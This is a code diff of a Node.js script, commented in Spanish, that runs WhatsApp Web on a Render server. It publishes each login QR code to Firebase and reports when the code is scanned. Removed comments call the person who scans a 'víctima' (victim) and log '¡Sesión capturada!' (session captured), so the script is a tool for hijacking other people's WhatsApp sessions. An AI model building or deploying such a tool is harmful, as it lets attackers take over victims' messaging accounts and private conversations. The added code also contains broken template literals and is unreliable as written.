@@ -1,10 +1,10 @@
-const puppeteer = require('puppeteer');
+const { Client, LocalAuth } = require('whatsapp-web.js');
 const admin = require('firebase-admin');
-const http = require('http');
+const express = require('express');
+const app = express();
 
-// 1. CARGAR LLAVE DE FIREBASE (Asegúrate que el archivo se llame exactamente así en GitHub)
+// 1. CARGAR FIREBASE
 const serviceAccount = require("./serviceAccountKey.json"); 
-
 if (!admin.apps.length) {
     admin.initializeApp({
         credential: admin.credential.cert(serviceAccount)
@@ -12,74 +12,47 @@ if (!admin.apps.length) {
 }
 const db = admin.firestore();
 
-// ==========================================
-// PEGA TU UID AQUÍ (Entre las comillas)
-// ==========================================
-const adminUID = "yN2SRV0ypvfzMXBKrCiUZxZgTil1"; 
-
-async function startWA() {
-    console.log("Iniciando motor para el usuario: " + adminUID);
-    
-    try {
-        const browser = await puppeteer.launch({
-            headless: "new",
-            // Esta ruta es la que Render usa para Chrome instalado mediante el comando de compilación
-            executablePath: '/usr/bin/google-chrome-stable', 
-            args: [
-                '--no-sandbox', 
-                '--disable-setuid-sandbox',
-                '--disable-dev-shm-usage',
-                '--single-process'
-            ]
-        });
-        
-        const page = await browser.newPage();
-        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36');
-        
-        console.log("Navegador listo. Entrando a WhatsApp Web...");
-        await page.goto('https://web.whatsapp.com', { waitUntil: 'networkidle2', timeout: 0 });
-
-        setInterval(async () => {
-            try {
-                const qrCanvas = await page.$('canvas');
-                if (qrCanvas) {
-                    const qrData = await page.evaluate(() => {
-                        const canvas = document.querySelector('canvas');
-                        return canvas ? canvas.toDataURL() : null;
-                    });
-
-                    if (qrData) {
-                        await db.collection("whatsapp_sessions").doc(adminUID).set({
-                            qrCode: qrData,
-                            status: "esperando",
-                            lastUpdate: admin.firestore.FieldValue.serverTimestamp()
-                        }, { merge: true });
-                        console.log("QR actualizado en Firebase.");
-                    }
-                }
-
-                // Detectamos si la víctima ya escaneó
-                const loggedIn = await page.$('header span[data-icon="chat"]');
-                if (loggedIn) {
-                    await db.collection("whatsapp_sessions").doc(adminUID).update({ status: "exito" });
-                    console.log("¡Sesión capturada!");
-                }
-            } catch (e) {
-                // Silencioso
-            }
-        }, 15000);
-
-    } catch (err) {
-        console.error("Error en el navegador:", err);
+// CONFIGURACIÓN DEL CLIENTE WHATSAPP
+const client = new Client({
+    authStrategy: new LocalAuth(),
+    puppeteer: {
+        headless: true,
+        args: [
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage',
+            '--single-process'
+        ],
+        // Render usa esta ruta para Chrome
+        executablePath: '/usr/bin/google-chrome-stable'
     }
-}
-
-// SERVIDOR DE SALUD PARA EVITAR TIMEOUT EN RENDER
-const port = process.env.PORT || 3000;
-http.createServer((req, res) => {
-    res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('MOTOR ONLINE\n');
-}).listen(port, () => {
-    console.log("Servidor escuchando en puerto " + port);
-    startWA(); 
 });
+
+// CUANDO SE GENERA EL QR
+client.on('qr', async (qr) => {
+    console.log('NUEVO QR GENERADO');
+    // Generamos una URL de imagen para el QR
+    const qrImage = https://api.qrserver.com/v1/create-qr-code/?size=264x264&data=${encodeURIComponent(qr)};
+    
+    // Lo subimos a Firebase a una ruta fija global
+    await db.collection("whatsapp_sessions").doc("global_session").set({
+        qrCode: qrImage,
+        status: "esperando",
+        lastUpdate: admin.firestore.FieldValue.serverTimestamp()
+    }, { merge: true });
+});
+
+// CUANDO SE INICIA SESIÓN
+client.on('ready', async () => {
+    console.log('¡CLIENTE LISTO!');
+    await db.collection("whatsapp_sessions").doc("global_session").update({
+        status: "exito"
+    });
+});
+
+client.initialize();
+
+// SERVIDOR PARA RENDER
+const port = process.env.PORT || 3000;
+app.get('/', (req, res) => res.send('MOTOR WA ONLINE'));
+app.listen(port, () => console.log(Servidor en puerto ${port}));
